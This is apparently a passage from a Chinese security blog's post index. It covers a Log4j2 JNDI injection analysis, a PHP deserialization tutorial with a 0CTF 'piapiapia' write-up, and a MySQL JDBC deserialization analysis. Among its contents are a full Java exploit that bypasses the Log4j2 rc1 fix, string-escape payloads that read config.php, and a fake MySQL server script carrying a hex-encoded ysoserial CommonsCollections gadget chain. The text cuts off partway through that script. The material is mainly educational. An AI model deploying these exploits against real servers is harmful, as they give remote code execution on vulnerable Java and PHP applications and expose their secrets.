logger = LogManager.getLogger(LongFunction.class);  \n  \n Configuration configuration = new DefaultConfiguration();  \n MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration,  \n new String[]&#123;\"lookups\"&#125;);  \n LogEvent logEvent = new MutableLogEvent(new StringBuilder(\"$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;\"),null);  \n messagePatternConverter.format(logEvent,new StringBuilder(\"$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;\"));  \n &#125;  \n&#125;\n\n\n这时候会成功进入到 JndiManager#lookup 里面去，这个方法在相较于 2.14.1 还是变化非常非常大的。\n\n在这里做了很多限制，一个一个来看\n\n\n在最开始的 this.allowedProtocols 为 {java,ldap,ldaps} 我们的 ldap 在其中，所以会继续\n接下来就是 this.allowedHosts 的限制，这个限制的非常死，只允许本地host\n\n\n后面还有对 javaSerializedData 中的 classname 做了处理；以及 Reference 和 javaFactory 做了处理，也就是对 JDNI 注入做了处理，师傅们可以去木头师傅的博客观看 ~\n\n但是其实最终的绕过的话，是因为抛出异常这里没有进行限制，所以我们传入的 Payload 可以是这样：&quot;$&#123;jndi:ldap://127.0.0.1:1234/ ExportObject&#125;&quot;，也就是多个空格，就可以进入到 catch 里面绕过\n\n\n\n完整 EXP 如下\nimport org.apache.logging.log4j.LogManager;  \nimport org.apache.logging.log4j.Logger;  \nimport org.apache.logging.log4j.core.LogEvent;  \nimport org.apache.logging.log4j.core.config.Configuration;  \nimport org.apache.logging.log4j.core.config.DefaultConfiguration;  \nimport org.apache.logging.log4j.core.impl.MutableLogEvent;  \nimport org.apache.logging.log4j.core.pattern.MessagePatternConverter;  \n  \nimport java.util.function.LongFunction;  \n  \n// 绕过 rc1 的 EXP，Windows 无法触发  \npublic class BypassRc1EXP &#123;  \n    public static void main(String[] args) &#123;  \n        Logger logger = LogManager.getLogger(LongFunction.class);  \n  \n Configuration configuration = new DefaultConfiguration();  \n MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration,  \n new String[]&#123;\"lookups\"&#125;);  \n LogEvent logEvent = new MutableLogEvent(new StringBuilder(\"$&#123;jndi:ldap://127.0.0.1:1234/ ExportObject&#125;\"),null);  \n messagePatternConverter.format(logEvent,new StringBuilder(\"$&#123;jndi:ldap://127.0.0.1:1234/ ExportObject&#125;\"));  \n &#125;  \n&#125;\n\nburpsuite主动扫描插件之ActiveScan++\nLog4j2 RCE Passive Scanner plugin for BurpSuite\n用于帮助企业内部快速扫描log4j2的jndi漏洞的burp插件\nf0ng&#x2F;log4j2burpscanner\n0x08 参考资料http://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/06.log4j2_rce%E5%88%86%E6%9E%90.htmlhttp://wjlshare.com/archives/1674http://wjlshare.com/archives/1677https://xz.aliyun.com/t/10649https://xz.aliyun.com/t/10689#toc-0https://y4tacker.github.io/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/#%E9%80%89%E6%8B%A9%E5%90%88%E9%80%82%E7%9A%84%E7%B1%BB%E5%AE%8C%E6%88%90challenge\n","categories":["漏洞复现"],"tags":["漏洞复现","Java"]},{"title":"PHP 反序列化","url":"/2022/09/07/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"PHP 反序列化\n\n\n0x01 前言Java 基础的反序列化已经学了一些内容了，因为最近要打省赛，打算粗略的过一遍 PHP 反序列化吧，学习 PHP 也是给自己少点压力，学 Java 确实难。\n0x02 PHP 的反序列化\n和 Java 一样，也是两个方法\n\n序列化：serialize()反序列化：unserialize()\n简单的 demo&lt;?php\nclass Test&#123;\n    public $age = '19';\n    public $name = 'Drunkbaby';\n\n    public function __construct()\n    &#123;\n        echo 'Test ' .$this->name . ' is ' . $this->age . 'years old ';\n    &#125;\n&#125;\n\n$a = new Test();\necho serialize($a) ;\n\necho PHP_EOL;\n\n$b = serialize($a);\n\necho $b;\n\n?>\n\n\n\nPHP 反序列化其实是有点让人难受的，因为它的序列化过程，将对象转化为字符串，这个字符串并非是二进制文件，而且说实话，我个人觉得可读性有点不太好，看着不太舒服吧……\n输出结果：\nTest Drunkbaby is 19years old O:4:\"Test\":2:&#123;s:3:\"age\";s:2:\"19\";s:4:\"name\";s:9:\"Drunkbaby\";&#125;\n\n此时就可以看出序列化后这里有多个字母，下面依次来进行解释\nO:4:\"Test\":2:&#123;s:3:\"age\";s:2:\"19\";s:4:\"name\";s:9:\"Drunkbaby\";&#125;\n\n对象类型:长度：类名：变量个数:&#123;类型:长度:\"值\";类型:长度:\"值\";类型:长度:\"值\";类型:长度:\"值\";&#125;\n\n字母的含义如下\na - array                  b - boolean\nd - double                 i - integer\no - common object          r - reference\ns - string                 C - custom object\nO - class                  N - null\nR - pointer reference      U - unicode string\n\n正常遇到的这种反序列化和序列化都是和 PHP    类与对象这部分知识点相关联的，所以我们需要简单了解类和对象这个知识点，同时掌握魔术方法的基础用法\n0x03 PHP 魔术方法\n翻看自己以前的文章，发现已经有所提及到了，但是我自己却没什么印象哈哈，还是重新过一下吧，也要不了多少时间。\n\n常见魔术方法有以下几种\n__construct()   当一个对象创建时被调用，\n__destruct()   当一个对象销毁时被调用，\n__toString()   当一个对象被当作一个字符串被调用。\n__wakeup()   使用unserialize时触发\n__sleep()    使用serialize时触发\n__destruct()    对象被销毁时触发\n__call()    在对象上下文中调用不可访问的方法时触发\n__callStatic()    在静态上下文中调用不可访问的方法时触发\n__get()    用于从不可访问的属性读取数据\n__set()    用于将数据写入不可访问的属性\n__isset()    在不可访问的属性上调用isset()或empty()触发\n__unset()     在不可访问的属性上使用unset()时触发\n__toString()    把类当作字符串使用时触发,返回值需要为字符串\n__invoke()   当脚本尝试将对象调用为函数时触发\n\n这是整体的，但这样看似乎显得过于抽象，因此我们将其进行分类，依次进行举例讲解\n__construct() 与 __destruct()__construct ： 在创建对象时候初始化对象，一般用于对变量赋初值。 __destruct ： 和构造函数相反，当对象所在函数调用完毕后执行。\n\n\n\n__destruct 还有一种利用方式，就是 __destruct() 在对象被主动销毁的时候，其实这里用销毁这个词我觉得并不妥当，严格意义上来说，其实是对象在结束整个过程后，最后进行的这么一个操作。\n&lt;?php\nclass bai&#123;\n\tpublic $name;\n\tpublic $age;\n\tpublic function __construct($name,$age)\n    &#123;\n\t\techo \"__construct()初始化\n\";\n\t\t$this->name=$name;//将传入的第一个参数赋值给name变量\n\t\t$this->age=$age;\n\t&#125;\n    public function __destruct()\n    &#123;\n        echo \"__destruct()执行结束\n\";\n    &#125;\t\t\n &#125;\n //主动销毁\n $a=new bai('quan9i',19);\n unset ($a);//主动销毁对象，此时先触发destruct魔法函数再echo\n echo\"777\n\";\n echo \"------------分隔符----------------\n\";\n //自动销毁\n $b=new bai('quan9i',19);\n echo \"123\n\";\n //此时先echo再触发destruct函数\n?>\n\n\n\n__sleep()__sleep()    serialize 之前被调用，可以指定要序列化的对象属性。\n\n代码如下\n&lt;?php\nclass bai&#123;\n\tpublic $name;\n\tpublic $age;\n\tpublic function __construct($name,$age)\n    &#123;\n\t\techo \"__construct()初始化\n\";\n\t\t$this->name=$name;\n\t\t$this->age=$age;\n\t&#125;\n    public function __sleep()\n    &#123;\n        echo \"当使用serialize时触发此方法\n\";\n        return array('name','age');\n    &#125;\n&#125;\n$a=new bai('Drunkbaby',19);\necho serialize($a);\n?>\n\n\n\n__wakeup()__wakeup()   反序列化恢复对象之前调用该方法\n\n实例如下\n实例如下\n&lt;?php\nclass bai&#123;\n\tpublic $name;\n\tpublic $age;\n\tpublic function __construct($name,$age)\n    &#123;\n\t\techo \"__construct()初始化&lt;br>\n\";\n\t\t$this->name=$name;\n\t\t$this->age=$age;\n\t&#125;\n    public function __wakeup()\n    &#123;\n        echo \"当使用unserialize时触发此方法&lt;br>\n\";\n        $this->age=1000;//更改$age的值为1000\n    &#125;\n&#125;\n$a=new bai('Drunkbabye',19);\n$b= serialize($a);\nvar_dump(unserialize($b));\n?>\n\n\n\n__toString()__toString() ：在对象当做字符串的时候会被调用。\n\n实例如下\n&lt;?php\n\nclass Test\n&#123;\n    public $a = 'This is a string';\n\n    public function good()&#123;\n        echo $this->a.'\n';\n    &#125;\n\n    // 在对象当做字符串的时候会被调用\n    public function __toString()\n    &#123;\n        return '__toString方法被调用\n';\n    &#125;\n&#125;\n\n$a = new Test();\n$a->good();\necho $a;\n?>\n\n\n\n\n__invoke()__invoke() ：将对象当作函数来使用时执行此方法。\n\n示例如下\n&lt;?php\n\nclass Test&#123;\n    public $data =\"调用正常方法\n\";\n\n    public function __invoke()\n    &#123;\n        echo\"调用__invoke()方法\";\n    &#125;\n&#125;\n$a= new test();\necho $a();\n?>\n\n\n\n\n这一个 __invoke 方法接触的比较少\n\n__get__get() 访问不存在的成员变量时调用的\n\n实例如下\n&lt;?php\n\nclass Test &#123;\n    public $n=123;\n    public function __get($name)&#123;\n        echo '__get 方法被调用，其中不存在变量 '.$name.'\n';\n    &#125;\n&#125;\n$a = new Test();\necho $a->Drunkbaby;//调用对象a中的变量Drunkbaby，由于不存在Drunkbaby这个变量，这时候就会调用__get魔术方法\n?>\n\n\n\n__set__set() ：设置不存在的成员变量时调用的；\n\n这一块 get 和 set 是可以放一起讲的，这两个方法很有意思，从某种程度来说是一种特别的抛出异常的手段。\n如果我一个类当中不存在某个属性，如果在 Java 里面，会直接抛出异常，而在 PHP 里面会调用魔术方法，这其实是有概率造成 Gadget Chain 的反序列化的，不同于 Java 里面死的抛出异常，PHP 的安全隐患非常大。\n代码如下\n&lt;?php\n\nclass xg&#123;\n    public $data = 100;\n    // protected $test=0;\n\n    public function __set($name,$value)&#123;\n        echo '__set 不存在成员变量 '.$name.'\n';\n        $this->test=$value;\n    &#125;\n\n    public function __get($name)&#123;\n        echo '__get 方法被调用，其中不存在变量 '.$name.'\n';\n    &#125;\n\n    public function show()&#123;\n        echo $this->test;\n    &#125;\n&#125;\n\n$a = new xg();\n$a->show(); //调用Get方法，这里就是输出test的值\necho '\n';\n$a->test= 777; // 给私有变量test赋值为777，但此时它是私有变量，就会调用__set，此时就会更改\n$a->show();\necho '\n';\n$a->Drunkbaby = 566;// 设置对象不存在的属性\n$a->show();// 经过__set方法的设置值为566\n?>\n\n__call()__call ：当调用对象中不存在的方法会自动调用该方法\n\n示例如下\n&lt;?php\n\nclass Test&#123;\n    public $data =\"调用正常方法\n\";\n    public function __call($name,$value)&#123;\n        echo \"__call 被调用，Test 类中不存在方法 \".$name.'\n';\n        var_dump($value);\n    &#125;\n    public function show()&#123;\n        echo $this->data;\n    &#125;\n&#125;\n$a= new test();\n$a->show(); //调用正常方法\necho\"--------------------分隔符----------------\n\";\n$a->Drunkbaby_Be_Clever('Drunkbaby',123); //调用一个不存在的方法，此时就调用了__call魔术方法\n\n?>\n\n\n\n我的理解里面，这也算是一种抛出异常\n__isset()__isset() : 检测对象的某个属性是否存在时执行此函数。\n\n当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。\n实例如下\n&lt;?php\n\nclass test&#123;\n    public $name;\n    private $age;\n\n    public function __construct($name, $age)&#123;\n        $this->name = $name;\n        $this->age = $age;\n    &#125;\n\n    // __isset()：当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。\n    public function __isset($content)&#123;\n        echo \"当使用isset()函数，自动调用&lt;br>\n\";\n        return isset($this->$content);\n    &#125;\n&#125;\n\n$a = new test(\"Drunkbaby\", 19);\n// public 成员\necho ($a->name),\"&lt;br>\n\";\n// private 成员\necho isset($a->name);\necho \"-----------分隔符--------------&lt;br>\n\";\necho isset($a->age);\n?>\n\n\n可以发现私有属性时会调用 isset 魔术方法(调用 protected 作用域的属性也会调用)，这两个就属于是不可访问的属性了，被访问的时候会进到 __isset() 里面\n\n\n__unset()__unset() ：在不可访问的属性上使用 unset () 时触发\n\n代码如下\n&lt;?php\n\nclass test&#123;\n    public $name;\n    private $age;\n\n    public function __construct($name, $age)&#123;\n        $this->name = $name;\n        $this->age = $age;\n    &#125;\n\n\n    public function __unset($content)&#123;\n        echo \"当使用unset()函数，自动调用\n\";\n        echo \"Drunkbaby is silly\";\n    &#125;\n&#125;\n\n$a = new test(\"Drunkbaby\", 19);\n// public 成员\nunset($a->name);\necho \"\n\";\n// private 成员\necho \"-----------分隔符--------------\n\";\nunset($a->age);\necho \"\n\";\n?>\n\n\n\n常用魔术函数汇总例子代码如下\n&lt;?php\nclass test&#123;\n public $varr1=\"abc\";\n public $varr2=\"123\";\n public function echoP()&#123;\n  echo $this->varr1.\"\n\";\n &#125;\n public function __construct()&#123;\n  echo \"__construct\n\";\n &#125;\n public function __destruct()&#123;\n  echo \"__destruct\n\";\n &#125;\n public function __toString()&#123;\n  return \"__toString\n\";\n &#125;\n public function __sleep()&#123;\n  echo \"__sleep\n\";\n  return array('varr1','varr2');\n &#125;\n public function __wakeup()&#123;\n  echo \"__wakeup\n\";\n &#125;\n&#125;\n\n$obj = new test();  //实例化对象，调用__construct()方法，输出__construct\n$obj->echoP();   //调用echoP()方法，输出\"abc\"\necho $obj;    //obj对象被当做字符串输出，调用__toString()方法，输出__toString\n$s =serialize($obj);  //obj对象被序列化，调用__sleep()方法，输出__sleep\necho $s.'\n';//sleep返回的信息此时被输出\necho unserialize($s);  //$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。后面这个是一个对象，因此会执行一次__destruct方法\n// 结束又会调用__destruct()方法，输出__destruct\n?>\n\n\n\n简单的 PHP 反序列化 CTF 题目0x04 反序列化之字符串逃逸\n其实也不能说算是字符串逃逸吧，个人认为说是字符串拼接，或许是更合理的。逃逸总是听着太高大上了\n\n首先来介绍一下这个 str_replace 函数\nstr_replace \nstr_replace — 字符串替换\n说明 \nmixed str_replace( mixed $search, mixed $replace, mixed $subject[, int &amp;$count] )\n该函数返回一个字符串或者数组。该字符串或数组是将 subject 中全部的 search 都被 replace 替换之后的结果。\n\n过滤后字符变多看一下我们本地的代码\n&lt;?php\n\nfunction change($str)&#123;\n    return str_replace(\"x\",\"xx\",$str);\n&#125;\n\n$name = $_GET['name'];\n$age = \"I am 11\";\n$arr = array($name,$age);\necho \"反序列化字符串：\";\nvar_dump(serialize($arr));\necho \"&lt;br/>\";\necho \"&lt;br/>\";\necho \"过滤后:\";\n$old = change(serialize($arr));\n$new = unserialize($old);\nvar_dump($new);\necho \"&lt;br/>\";\necho \"&lt;br/>此时，age=$new[1]\";\n\n\n正常情况下是这样的\n\n\n如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来，这也就是 str_replace)\n传入的参数 name，先与 age 一起组成了一个数组，经过过滤之后，再进行反序列化的工作，所以这里我们可以构造恶意的 name，此时我们传入\nname&#x3D;Drunkbabyxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;whoami&quot;;&#125;\n\n后面这部分：&quot;;i:1;s:6:&quot;whoami&quot;;&#125; 的长度是 20 \n\n\n由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符 &quot;;i:1;s:6:&quot;whoami&quot;;&#125;，从而造成&quot;;i:1;s:6:&quot;whoami&quot;;&#125; 的溢出，而 &quot; 闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出 whoami\n最后的 ;&#125; 闭合反序列化全过程导致原来的 &quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot; 被舍弃，不影响反序列化过程\n构造 payload 之后成功\n\n\nbugku Web new php0CTF 2016 piapiapia 1 字符串逃逸后变多题目是有源码泄露的，得到源码之后我们看到 config.php 里面有一个 $flag\n\n\n从这里面就可以猜想，可能是要我们去读取 config.php\n继续看，在 profile.php 里面，很明显可以看到存在一个危险函数 file_get_contents，这就更加容易使我们去想到是读取 config.php 的了。\n\n\n做的 file_get_contents 里面是什么东西呢，是 $profile[&#39;photo&#39;]，我们溯上去，看一看 $profile 是什么\n\n\n可以看到 $profile 是 $user 对象中的 show_profile() 方法，传入的参数是 $_SESSION[&#39;username&#39;]。\n跟进一下 show_profile() 方法，先看返回值，是 $object-&gt;profile，也就是返回一个 profile 对象。$object 则是通过 parent::select($this-&gt;table, $where)，也就是经过了 select 搞来的，再往上看，发现还调用了一个 filter() 方法，跟进去看一下。\n\n\n字符串逃逸昭然若揭。\n现在基本的攻击思路已经明确了，基本上是依靠 username 这里的可控点进行字符串逃逸的攻击，可是我们看的东西其实全程都和 file_get_contents($profile[&#39;photo&#39;]) 无关\n终于，在 update.php 里面找到了关于 $profile 序列化的代码\n\n\n所以就是用 username 进行字符串逃逸的工作，让 photo 那里直接读取 config.php，去到 update 界面开始攻击。\n\n\n我们要把 filename 修改成恶意的 config.php，构造出的结果如下\n$profile = a:4:&#123;s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:8:\"ss@q.com\";s:8:\"nickname\";s:8:\"sea_sand\";s:5:\"photo\";s:10:\"config.php\";&#125;s:39:\"upload/804f743824c0451b2f60d81b63b6a900\";&#125;\nprint_r(unserialize($profile));\n\n结果如下：\nArray\n(\n    [phone] => 12345678901\n    [email] => ss@q.com\n    [nickname] => sea_sand\n    [photo] => config.php\n)\n\n但是很明显，不可能直接可以读到 config.php，需要我们在 nickname 那里进行恶意构造，所以 payload\nnickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";&#125;s:5:\"photo\";s:10:\"config.php\";&#125;\n\nnickname 最后面塞上&quot;;&#125;s:5:“photo”;s:10:“config.php”;&#125;，一共是34个字符，如果利用正则替换34个where，就可以直接把后面这些字符挤出去，让他们成为 photo\n值得注意的是，nickname 要从原本的 nickname  修改成数组，因为要进行闭合\n\n\n此时我们已经可以读到 config.php，只需要把内容进行 base64 解码即可\n\n\n过滤后字符变少\n异曲同工，之前我们是把字符挤出去，这里我们要把字符塞进来。\n\n源代码如下\n&lt;?php\n\nfunction change($str)&#123;\n    return str_replace(\"xx\",\"3\",$str);\n&#125;\n\n$arr['name'] = $_GET['name'];\n$arr['age'] = $_GET['age'];\necho \"反序列化字符串：\";\nvar_dump(serialize($arr));\necho \"&lt;br/>\";\necho \"过滤后:\";\n$old = change(serialize($arr));\nvar_dump($old);\necho \"&lt;br/>\";\n$new = unserialize($old);\nvar_dump($new);\necho \"&lt;br/>此时，age=\";\necho $new['age'];\n\n\n正常情况下，回显如此\n\n\n现在我们把 name 改成 1xx，这里肯定会报错，过滤之后是减少了的，这就和字符变多的道理是一样的。\n\n\n所以此处我们的利用思路应该是这样的：在后面构造恶意的 payload，然后通过字符减少，把恶意 payload 提前闭合。\npayload\n?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11\";s:3:\"age\";s:6:\"whoami\";&#125;\n\n\n\n0x05 Session 反序列化","categories":["PHP"],"tags":["PHP"]},{"title":"MySQL jdbc 反序列化分析","url":"/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/","content":"MySQL jdbc 反序列化分析\n\n0x01 前言听师傅们说这条链子用的比较广泛，所以最近学一学，本来是想配合着 tabby 或是 codeql 一起看的，但是 tabby 的环境搭建一直有问题，耽误了很久时间，所以就直接看了\n0x02 JDBC 的基础\n本来不太想写这点基础的，但想了想觉得还是要补一点\n\nJDBC 对数据库的操作一般有以下步骤 \n\n导入包：要求您包含包含数据库编程所需的 JDBC 类的软件包。通常，使用 import java.sql.* 就足够了。 \n注册 JDBC 驱动程序：要求您初始化驱动程序，以便您可以打开与数据库的通信通道。 \n建立连接：需要使用 * DriverManager.getConnection ()* 方法来创建一个 Connection 对象，该对象表示与数据库服务器的物理连接。要创建新的数据库，在准备数据库 URL 时，无需提供任何数据库名称，如下面的示例所述。 \n执行查询：需要使用 Statement 类型的对象来构建 SQL 语句并将其提交到数据库。\n清理：需要显式关闭所有数据库资源，而不是依赖 JVM 的垃圾回收。\n\n例如创建一个数据库\n// 步骤 1. 导入所需的软件包\nimport java.sql.*;\n\npublic class JDBCExample &#123;\n   // JDBC 驱动程序名称和数据库 URL\n   static final String JDBC_DRIVER = \"com.mysql.jdbc.Driver\";  \n   static final String DB_URL = \"jdbc:mysql://localhost/\";\n\n   //  数据库凭证\n   static final String USER = \"username\";\n   static final String PASS = \"password\";\n   \n   public static void main(String[] args) &#123;\n   Connection conn = null;\n   Statement stmt = null;\n   try&#123;\n      // 步骤 2：注册 JDBC 驱动程序\n      Class.forName(\"com.mysql.jdbc.Driver\");\n\n      // 步骤 3：建立连接\n      System.out.println(\"Connecting to database...\");\n      conn = DriverManager.getConnection(DB_URL, USER, PASS);\n\n      // 步骤 4：执行查询\n      System.out.println(\"Creating database...\");\n      stmt = conn.createStatement();\n      \n      String sql = \"CREATE DATABASE STUDENTS\";\n      stmt.executeUpdate(sql);\n      System.out.println(\"Database created successfully...\");\n   &#125;catch(SQLException se)&#123;\n      // 处理 JDBC 错误\n      se.printStackTrace();\n   &#125;catch(Exception e)&#123;\n      // 处理 Class.forName 的错误\n      e.printStackTrace();\n   &#125;finally&#123;\n      // 用于关闭资源\n      try&#123;\n         if(stmt!=null)\n            stmt.close();\n      &#125;catch(SQLException se2)&#123;\n      \n      &#125;\n      try&#123;\n         if(conn!=null)\n            conn.close();\n      &#125;catch(SQLException se)&#123;\n         se.printStackTrace();\n      &#125;\n   &#125;// 结束 try\n   System.out.println(\"Goodbye!\");\n&#125;// 结束 main\n&#125;// 结束 JDBCExample\n\n这一个 MySQL-JDBC 的漏洞简单来说就是 MySQL 对服务器的请求过程利用\n  \n\n正常的命令执行得到结果后就结束了，但是如果响应的结果是一个恶意的 poc 并且在后续过程中进行了反序列化，那么就可以用来执行任意命令了\n0x03 漏洞分析漏洞原理如果攻击者能够控制 JDBC 连接设置项，那么就可以通过设置其指向恶意 MySQL 服务器进行 ObjectInputStream.readObject() 的反序列化攻击从而 RCE。\n具体点说，就是通过 JDBC 连接 MySQL 服务端时，会有几个内置的 SQL 查询语句要执行，其中两个查询的结果集在 MySQL 客户端被处理时会调用 ObjectInputStream.readObject() 进行反序列化操作。如果攻击者搭建恶意 MySQL 服务器来控制这两个查询的结果集，并且攻击者可以控制 JDBC 连接设置项，那么就能触发 MySQL JDBC 客户端反序列化漏洞。\n可被利用的两条查询语句：\n\nSHOW SESSION STATUS\nSHOW COLLATION\n\n链子pom.xml\n&lt;dependency>  \n  &lt;groupId>commons-collections&lt;/groupId>  \n  &lt;artifactId>commons-collections&lt;/artifactId>  \n  &lt;version>3.2.1&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n  &lt;groupId>mysql&lt;/groupId>  \n  &lt;artifactId>mysql-connector-java&lt;/artifactId>  \n  &lt;version>8.0.13&lt;/version>  \n&lt;/dependency>\n\nCC 链作为命令执行的部分，也就是说需要我们找一个 JDBC 合理的入口类，并且这个入口类需要在 JDBC 连接过程中被自动执行，最终是找到了这样一个类 com.mysql.cj.jdbc.result.ResultSetImpl，它的 getObject() 方法调用了 readObject() 方法\n\n\nJDBC 通过 MySQL 数据库查询数据会返回一个结果集，将查询到的结果返回给程序，并将结果封装在 ResultSetImpl 这个类中。\n所以这个类不满足用户可控输入这一点，所以我们应该要去找谁调用了 ResultSetImpl#getObject()\n\n\n根据网上的链子是 ResultSetUtil 类调用了 ResultSetImpl#getObject()，并且能够继续向上调用（如果 tabby 或者其他工具搞好了应该会用那些工具分析）\nResultSetUtil 这个类是用来处理一些测试实例的结果，或者是 profiler 的结果。简而言之还是用来做数据处理的类，继续往上看谁调用了它。\n\n\n最终是 com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues 方法调用了 ResultSetUtil#resultSetToMap\nServerStatusDiffInterceptor 是一个拦截器，在 JDBC URL 中设定属性 queryInterceptors 为 ServerStatusDiffInterceptor 时，执行查询语句会调用拦截器的 preProcess 和 postProcess 方法，这是一个自动执行的过程，我们可以把它作为利用链头。\n\n\n看一下 populateMapWithSessionStatusValues 方法的代码\n\n\n先建立了 JDBC 的连接，并创建查询，查询语句是 SHOW SESSION STATUS，接着调用 ResultSetUtil.resultSetToMap，完成查询并封装查询结果。\n漏洞复现\n之前看 Y4tacker 师傅的文章时，发现有提到是直接用 python 脚本打，里面有很多数据，但是这个 ”打“ 肯定不是空穴来风的，所以需要再明确一下攻击思路。\n\n环境搭建可能会踩坑，若有师傅踩坑了可以滴我一下\n我们需要先伪造数据包，并用 wireshark 抓包，观测一下流量，编写 Test 类内容如下\nimport java.sql.*;  \n  \npublic class Test &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        Class.forName(\"com.mysql.jdbc.Driver\");  \n        String jdbc_url = \"jdbc:mysql://192.168.116.129:3306/test?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai\" +  \n                \"&amp;autoDeserialize=true\" +  \n                \"&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\";  \n        Connection con = DriverManager.getConnection(jdbc_url, \"root\", \"123123\");  \n    &#125;  \n&#125;\n\n通过 tcp.port == 3306 &amp;&amp; mysql 来过滤协议\n\n\n我们需要用 python 脚本伪造的 MySQL 服务端需要伪造的是 Greeting 数据包 Response OK 、Response Response OK 以及 JDBC 执行查询语句 SHOW SESSION STATUS 的返回包等，我们逐个来分析。\n首先是 greeting 数据包\n\n\n这里发送 greeting 数据包之后需要发送 Login 请求，Login 请求里面包含了 user 和 db 以及 password，在这之后才会返回 Response OK 的数据包\n\n\nLogin 的请求包在发送完 greeting 包之后会自动发送，所以我们只需要发送一段 greeting 数据包，返回一段 Response OK 数据包即可，Response OK 包如下\n\n\n继续往下，需要编写四个 Request Query 包的 Response 包后，才是 SHOW SESSION STATUS\n\n\n响应包的编写需要我们将 MySQL Protocol 的部分全部复制进来\n\n\n如此，构造出最后的 fake MySQL 服务端\nimport socket\nimport binascii\nimport os\n\ngreeting_data=\"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\"\nresponse_ok_data=\"0700000200000002000000\"\n\ndef receive_data(conn):\n    data = conn.recv(1024)\n    print(\"[*] Receiveing the package : &#123;&#125;\".format(data))\n    return str(data).lower()\n\ndef send_data(conn,data):\n    print(\"[*] Sending the package : &#123;&#125;\".format(data))\n    conn.send(binascii.a2b_hex(data))\n\ndef get_payload_content():\n    #file文件的内容使用ysoserial生成的 使用规则  java -jar ysoserial [common7那个]  \"calc\" > a \n    file= r'a'\n    if os.path.isfile(file):\n        with open(file, 'rb') as f:\n            payload_content = str(binascii.b2a_hex(f.read()),encoding='utf-8')\n        print(\"open successs\")\n\n    else:\n        print(\"open false\")\n        #calc\n        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'\n    return payload_content\n\n# 主要逻辑\ndef run():\n\n    while 1:\n        conn, addr = sk.accept()\n        print(\"Connection come from 